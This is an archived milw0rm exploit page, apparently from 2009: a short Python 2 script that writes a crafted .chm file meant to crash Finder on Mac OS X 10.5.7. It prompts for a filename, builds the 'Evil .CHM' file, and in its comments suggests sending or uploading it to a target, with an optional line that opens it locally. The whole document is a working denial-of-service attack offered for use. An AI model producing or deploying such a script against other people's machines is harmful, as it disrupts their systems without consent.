<html><head><title>Mac OS X 10.5.7 (.CHM File) Local Finder.app Denial of Service Exploit</title></head><pre>#!/usr/bin/env python

import os;

print &quot;&quot;&quot;
###############################################################################
#									      #
# Mac OS X 10.5.7 Local Finder.app DoS (.CHM)		                      #
# By: Dr_IDE and s0kket						    	      #
# Greets to offsec                                                            #
# Tested on OS X 10.5.7 (This will most likely kill more than this version.   #
#      									      #
###############################################################################
\n&quot;&quot;&quot;;

fname = (raw_input(&quot; [*] Enter the filename you would like to create:&quot;));
print &quot; [*] Creating Evil .CHM file...&quot;;

try:
	f1 = open(fname + '.chm','w');
	f1.write(&quot;#################################################\n&quot;);
	f1.write(&quot;#                                               #\n&quot;);
	f1.write(&quot;# OSX 10.5.7(X?) Local Finder.app DoS (.CHM)    #\n&quot;);
	f1.write(&quot;# By: Dr_IDE and s0kket.                        #\n&quot;);          
	f1.write(&quot;# Greets to offsec.                             #\n&quot;);
	f1.write(&quot;# It really shouldn't be this easy...           #\n&quot;);
	f1.write(&quot;#                                               #\n&quot;);
	f1.write(&quot;#################################################\n\n&quot;);
	f1.close();

	print &quot; [*] Payload has been created.&quot;;
	print &quot; [*] If the user opens the payload with Finder they won't be happy.&quot;;

	#
	# There are two options for this attack:
	# 1.) You can choose to automagically open the chm finder. 
	# As long as a VMware/Parallels isn't installed then finder is 
	# the default app for this extension.
	#
	# 2.) We will just create file and send it/upload it to the target. 
	#
	# Note: Only uncomment one of these lines at a time.
	#
	
	# This will mess up the system pretty bad, only way out is 
	# reboot or force quit of Finder.app
	#x = os.system('open ' + fname + '.chm');
	
	# This will create the offending .chm file and quit.
	x = raw_input(&quot; [*] Press Enter to Quit.&quot;);

except:
	print &quot;Error.&quot;

# milw0rm.com [2009-08-07]</pre></html>